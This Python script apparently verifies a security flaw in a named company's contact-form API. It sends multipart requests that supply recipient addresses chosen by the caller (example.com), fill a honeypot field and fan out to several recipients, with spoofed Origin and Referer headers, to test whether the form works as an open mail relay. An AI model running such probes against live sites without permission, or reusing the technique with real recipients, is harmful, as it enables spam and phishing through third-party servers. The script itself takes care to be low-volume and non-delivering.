#!/usr/bin/env python3
"""Independent verification of POST /api/send recipient control.
Uses ONLY RFC2606-reserved example.com addresses for attacker-supplied recipients
so no real third party receives mail. Non-destructive, low volume.
"""
import json, time, uuid, urllib.request, urllib.error

URL = "https://www.infinitycapital.bh/api/send"
MARK = "vrf-" + uuid.uuid4().hex[:10]

def build(targets, check=""):
    # multipart/form-data exactly like the site's own JS (FormData)
    boundary = "----vrf" + uuid.uuid4().hex[:16]
    fields = [
        ("fname", "Verification"),
        ("lname", "Tester"),
        ("areacode", "973"),
        ("tel", "5550001234"),
        ("cname", "Independent Verify"),
        ("subject", f"Relay check {MARK}"),
        ("msg", f"Authorization test marker {MARK}"),
        ("check", check),
        ("targets", targets),
    ]
    body = b""
    for k, v in fields:
        body += (f"--{boundary}\r\n").encode()
        body += (f'Content-Disposition: form-data; name="{k}"\r\n\r\n').encode()
        body += (str(v) + "\r\n").encode()
    body += (f"--{boundary}--\r\n").encode()
    return body, "multipart/form-data; boundary=" + boundary

def send(label, targets, check=""):
    body, ct = build(targets, check)
    req = urllib.request.Request(URL, data=body, method="POST", headers={
        "Content-Type": ct,
        "User-Agent": "Mozilla/5.0 (independent-verification)",
        "Accept": "*/*",
        "Origin": "https://www.infinitycapital.bh",
        "Referer": "https://www.infinitycapital.bh/contact",
    })
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=45)
        code, raw = r.status, r.read()
    except urllib.error.HTTPError as e:
        code, raw = e.code, e.read()
    dt = time.time() - t0
    out = {"label": label, "targets_sent": targets, "check_sent": repr(check),
           "http": code, "ms": int(dt*1000), "body": raw.decode("utf-8", "replace")[:800]}
    print(json.dumps(out, indent=2))
    return out

results = []
# 1. CONTROL: the site's own intended recipient (from CMS: targets=["info@infinitycapital.bh"])
results.append(send("CONTROL-own-recipient", "info@infinitycapital.bh"))
time.sleep(2)
# 2. TEST: attacker-supplied third-party recipient (RFC2606 reserved, null MX -> no real delivery)
results.append(send("TEST-attacker-recipient", f"relay-{MARK}@example.com"))
time.sleep(2)
# 3. TEST: honeypot field 'check' populated with a real value (bot mitigation test)
results.append(send("TEST-honeypot-check-filled", f"honeypot-{MARK}@example.com", check="i-am-a-real-bot-not-empty"))
time.sleep(2)
# 4. TEST: multi-recipient fan-out (comma separated + JSON array forms)
results.append(send("TEST-multi-comma", f"a-{MARK}@example.com,b-{MARK}@example.com"))
time.sleep(2)
results.append(send("TEST-multi-json-array", json.dumps([f"j1-{MARK}@example.com", f"j2-{MARK}@example.com"])))

print("\nMARKER=" + MARK)
print("SUMMARY")
for r in results:
    print(f"  {r['label']:28s} targets={r['targets_sent'][:40]:42s} http={r['http']} body={r['body'][:120]}")
